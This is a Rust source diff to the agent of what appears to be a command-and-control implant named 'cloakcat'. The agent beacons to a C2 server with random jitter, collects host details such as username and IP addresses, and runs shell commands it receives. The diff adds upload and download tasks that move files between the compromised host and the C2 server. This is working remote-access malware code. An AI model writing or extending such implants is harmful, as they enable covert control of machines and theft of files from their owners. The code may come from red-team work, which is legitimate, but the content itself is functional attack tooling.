@@ -11,13 +11,17 @@ use std::env;
 use std::time::Duration;
 
 use anyhow::Context;
-use cloakcat_protocol::{profile_by_name, sign_result, Command, DerivedKeys, Endpoints, ResultReq};
+use cloakcat_protocol::{
+    profile_by_name, sign_result, Command, DerivedKeys, DownloadTask, Endpoints, ResultReq,
+    TaskType, UploadTask,
+};
 use rand::Rng;
 use tokio::time::sleep;
 
 use crate::config::load_agent_config;
 use crate::exec::run_command;
 use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};
+use crate::tasks;
 use crate::transport::{HttpTransport, Transport};
 
 fn rand_between(min_ms: u64, max_ms: u64) -> Duration {
@@ -56,6 +60,37 @@ async fn upload_result<T: Transport>(
         signature,
     };
     transport.send_result(result_url, auth_token, &body).await
+}
+
+async fn dispatch_task<T: Transport>(
+    transport: &T,
+    c2_url: &str,
+    agent_id: &str,
+    auth_token: &str,
+    cmd: &Command,
+) -> anyhow::Result<(i32, String, String)> {
+    match cmd.task_type {
+        TaskType::Shell => run_command(cmd).await,
+        TaskType::Upload => {
+            let task: UploadTask = serde_json::from_str(&cmd.command)
+                .context("bad UploadTask payload")?;
+            let file_url = format!("{}/v1/transfer/upload-file/{}", c2_url, task.transfer_id);
+            tasks::fs::upload_handler(transport, &file_url, auth_token, &task.path).await
+        }
+        TaskType::Download => {
+            let task: DownloadTask = serde_json::from_str(&cmd.command)
+                .context("bad DownloadTask payload")?;
+            let chunk_url = format!("{}/v1/transfer/download-chunk/{}", c2_url, agent_id);
+            tasks::fs::download_handler(
+                transport,
+                &chunk_url,
+                auth_token,
+                &task.transfer_id,
+                &task.path,
+            )
+            .await
+        }
+    }
 }
 
 fn load_or_create_agent_id() -> String {
@@ -178,15 +213,15 @@ pub async fn run() -> anyhow::Result<()> {
                 continue;
             }
         };
-        debug_log!("[agent] poll: got cmd id={} cmd={}", cmd.cmd_id, cmd.command);
+        debug_log!("[agent] poll: got cmd id={} type={:?}", cmd.cmd_id, cmd.task_type);
 
-        let (exit_code, stdout, stderr) = match run_command(&cmd).await {
+        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd).await {
             Ok(triple) => triple,
             Err(e) => {
-                debug_log!("[agent] exec error: {e} -> send minimal result");
+                debug_log!("[agent] task error: {e} -> send minimal result");
                 let exit_code = -1;
                 let stdout = String::new();
-                let stderr = format!("exec error: {e}");
+                let stderr = format!("task error: {e}");
                 if let Err(e) = upload_result(
                     &transport,
                     &endpoints.result,
@@ -200,7 +235,7 @@ pub async fn run() -> anyhow::Result<()> {
                 )
                 .await
                 {
-                    debug_log!("[agent] result upload after exec error failed: {e}");
+                    debug_log!("[agent] result upload after task error failed: {e}");
                 }
                 backoff_ms = None;
                 sleep(rand_between(beacon_min, beacon_max)).await;
